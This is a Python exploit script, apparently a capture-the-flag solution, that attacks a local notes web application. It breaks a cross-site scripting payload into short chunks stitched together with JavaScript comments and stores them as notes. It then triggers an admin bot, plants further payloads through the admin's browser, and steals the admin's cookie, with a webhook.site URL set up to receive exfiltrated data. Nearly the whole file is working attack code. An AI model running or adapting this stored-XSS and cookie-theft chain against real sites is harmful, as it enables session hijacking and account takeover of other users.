from bs4 import BeautifulSoup
import base64
import requests as r
import time
import random
import os
import hashlib
import sys
import urllib.parse
import json

# First input should be cookie

reserved = {i: urllib.parse.quote(i) for i in R'+/<>'}

admin_chunk_max = 56
chunk_max = 16
# 0 = no padding, 1 = start, 2 = middle, 3 = end
def create_chunk(payload, pos):
    for char, ch_pc_enc in reserved.items(): # Don't need to worry about length of URLencoding because server measures after it is resolved'
        payload = payload.replace(char, ch_pc_enc)
    if pos == 0:
        if len(payload) < chunk_max + 1:
            return payload
        else:
            print("Payload Length Too Long")
            print(payload)
            input()
            exit();

    if(len(payload) > chunk_max - 2):
        print("Payload Length Too Long")
        print(payload)
        input()
        exit();
    if pos == 1:
        return payload + "/*"
    elif pos == 2:
        if(len(payload) > chunk_max - 4):
            print("Payload Length Too Long")
            print(payload)
            input()
            exit();
        return "*/" + payload + "/*"
    else:
        return "*/" + payload

# admins are allowed longer payloads
def create_chunk_admin(payload, pos):
    for char, ch_pc_enc in reserved.items():
        payload = payload.replace(char, ch_pc_enc)
    if pos == 0:
        if len(payload) < admin_chunk_max + 1:
            return payload
        else:
            print("Payload Length Too Long")
            print(payload)
            input()
            exit();

    if(len(payload) > admin_chunk_max - 2):
        print("Payload Length Too Long")
        print(payload)
        input()
        exit();
    if pos == 1:
        return payload + "/*"
    elif pos == 2:
        if(len(payload) > admin_chunk_max - 4):
            print("Payload Length Too Long")
            print(payload)
            input()
            exit();
        return "*/" + payload + "/*"
    else:
        return "*/" + payload

# for the meat of the javascript exploit code. Assumes not the start or end. Varname should be as short as possible, assumes len 1
def create_var(tehstring, varname):
    ret = list()

    ret.append(create_chunk(f"var {varname} =", 2))
    ret.append(create_chunk('"";', 2))

    adder = varname + "%2B="
    while len(tehstring) > 0:
        ret.append(create_chunk(adder, 2))
        ret.append(create_chunk(f'"{tehstring[0:chunk_max - 7]}";', 2))
        tehstring = tehstring[chunk_max - 7:]
    return ret

# admins are allowed longer payloads. Assumes varname len 1
def create_var_admin(tehstring, varname):
    ret = list()

    ret.append(create_chunk_admin(f"var {varname} =@@;", 2))

    while len(tehstring) > 0:
        ret.append(create_chunk_admin(f"{varname}%2B=@{tehstring[0:admin_chunk_max-12]}@;", 2))
        tehstring = tehstring[admin_chunk_max-12:]
    return ret

def sendnote(note, url, cookie):
    print(f"{url}/create?note={note}")
    r1 = r.get(f"{url}/create?note={note}", data={
    }, headers = {"Cookie" : cookie})

def requestadmin(url, cookie):
    print(f"{url}/report/{cookie[5:]}")
    r1 = r.get(f"{url}/report/{cookie[5:]}", data={
    }, headers = {"Cookie" : cookie})
    cont = r1.content.decode()
    print(cont)
    return cont[35:]

def requestclear(url, cookie):
    print(f"{url}/clear")
    r1 = r.get(f"{url}/clear", data={
    }, headers = {"Cookie" : cookie})

# To make exploit more consistent in light of latency. May need to increase the delay in the payloads > 5000 if strained
def repeat_sleep(url):
    r1 = r.get(f"{url}", data={}, headers = {"Cookie" : cookie});
    count_init = int(r1.content.split(b'<div id="customers"> Customer Count: ')[1].split(b'<')[0])
    while(True):
        time.sleep(1)
        r1 = r.get(f"{url}", data={}, headers = {"Cookie" : cookie});
        count = int(r1.content.split(b'<div id="customers"> Customer Count: ')[1].split(b'<')[0])
        if count - count_init > 1:
            print("Admin Visited!")
            break
        else:
            count_init = count

# Fill this in with actual URL to challenge
url = "http://127.0.0.1:80"

# Fill this in with your own webhook url
webhook = "https://webhook.site/94f716c7-689c-4f12-9b62-7b1ee6fb8754?p="


if len(sys.argv) > 1:
    cookie = f"user={sys.argv[1]}"
else:
    print(f"{url}/")
    r1 = r.get(f"{url}/", data={
    }, headers = {})
    cookie = "user=" + r1.url.split("/")[4]
    print(cookie)

# First Payload: <img src =x onerror='setTimeout(function(){window.location.reload();},5000);'>

chunks = list()
chunks.append(create_chunk("<img src='", 0))
chunks.append(create_chunk("'onerror='", 1))

chunks.extend(create_var("getElementById", "e"))
chunks.extend(create_var("papa_gif", "s"))
chunks.extend(create_var("setTimeout", "t"))
chunks.extend(create_var(f"http://127.0.0.1:3000/create?note=@hello@", "c"))

chunks.append(create_chunk('var v=', 2))
chunks.append(create_chunk("document", 2))
chunks.append(create_chunk("[e]", 2))
chunks.append(create_chunk("(s);", 2))

chunks.append(create_chunk('v.src=c;', 2))

chunks.extend(create_var("setTimeout", "t"))
chunks.append(create_chunk('window', 2))
chunks.append(create_chunk('[t](', 2))
chunks.append(create_chunk('function', 2))
chunks.append(create_chunk('(){', 2))
chunks.append(create_chunk('window.', 2))
chunks.append(create_chunk('location', 2))
chunks.append(create_chunk('.reload', 2))
chunks.append(create_chunk('();},', 2))
chunks.append(create_chunk('10000);', 2))
chunks.append(create_chunk("'>", 3))

for note in chunks:
    print(f"{url}/create?note={note}")
    r1 = r.get(f"{url}/create?note={note}", data={
    }, headers = {"Cookie" : cookie})

#admin_payload = "<iframe src =x onerror='setTimeout(function(){document.cookie=\"COOKIE\"; window.location =\"http://127.0.0.1:3000?create=\" + document.cookie;},5000);'>"
# For admin to craft

admin_payload = list()

admin_payload.append(create_chunk_admin("<img src=`x` onerror=`", 1))
admin_payload.extend(create_var_admin("setTimeout", "t"))
admin_payload.extend(create_var_admin("getElementById", "e"))
admin_payload.extend(create_var_admin(cookie, "w"))
admin_payload.extend(create_var_admin("; path=/", "q"))
admin_payload.extend(create_var_admin("http://127.0.0.1:3000/create?note=", "u"))

admin_payload.append(create_chunk_admin("window[t](function(){", 2))
admin_payload.append(create_chunk_admin("document.cookie=w%2Bq;window.location=u%2B", 2))
admin_payload.append(create_chunk_admin('document.cookie.substring(0, 50);},5000);`>', 3))

admin_id = requestadmin(url, cookie)

print(admin_id)

repeat_sleep(url)

for bit in admin_payload:
    requestclear(url, cookie)
    chunks = list()
    chunks.append(create_chunk("<img src='", 0))
    chunks.append(create_chunk("'onerror='", 1))

    chunks.extend(create_var("encodeURIComponent", "n"))
    chunks.extend(create_var("getElementById", "e"))
    chunks.extend(create_var("papa_gif", "s"))
    chunks.extend(create_var("setTimeout", "t"))
    chunks.extend(create_var(f"http://127.0.0.1:3000/create?note={bit}", "c"))

    chunks.append(create_chunk('var v=', 2))
    chunks.append(create_chunk("document", 2))
    chunks.append(create_chunk("[e]", 2))
    chunks.append(create_chunk("(s);", 2))

    chunks.append(create_chunk('v.src=', 2))
    chunks.append(create_chunk('c.replaceAll', 2))
    chunks.append(create_chunk('("@",', 2))
    chunks.append(create_chunk('String.', 2))
    chunks.append(create_chunk('fromCharCode', 2))
    chunks.append(create_chunk('(34))', 2))
    chunks.append(create_chunk('.replaceAll', 2))
    chunks.append(create_chunk('("`",', 2))
    chunks.append(create_chunk('String.', 2))
    chunks.append(create_chunk('fromCharCode', 2))
    chunks.append(create_chunk('(39))', 2))
    chunks.append(create_chunk('.replaceAll', 2))
    chunks.append(create_chunk('("+",', 2))
    chunks.append(create_chunk('window[n]', 2))
    chunks.append(create_chunk('("+"));', 2))
    chunks.append(create_chunk('window[t](', 2))
    chunks.append(create_chunk('function', 2))
    chunks.append(create_chunk('(){', 2))
    chunks.append(create_chunk('window.', 2))
    chunks.append(create_chunk('location', 2))
    chunks.append(create_chunk('.reload', 2))
    chunks.append(create_chunk('();},', 2))
    chunks.append(create_chunk('10000);', 2))
    chunks.append(create_chunk("'>", 3))

    for note in chunks:
        sendnote(note, url, cookie)
    repeat_sleep(url)

requestclear(url, cookie)
chunks = list()
chunks.append(create_chunk("<img src='", 0))
chunks.append(create_chunk("'onerror='", 1))

chunks.extend(create_var(f"http://127.0.0.1:3000/user/{admin_id}", "c"))

chunks.extend(create_var("setTimeout", "t"))
chunks.append(create_chunk('window', 2))
chunks.append(create_chunk('[t](', 2))
chunks.append(create_chunk('function', 2))
chunks.append(create_chunk('(){', 2))
chunks.append(create_chunk('window.', 2))
chunks.append(create_chunk('location', 2))
chunks.append(create_chunk('=c;},', 2))
chunks.append(create_chunk("10000);'>", 3))

for note in chunks:
    sendnote(note, url, cookie)

repeat_sleep(url)

# Give admin a bit to get there
time.sleep(15)
r1 = r.get(f"{url}", data={}, headers = {"Cookie" : cookie});
print(r1.content)
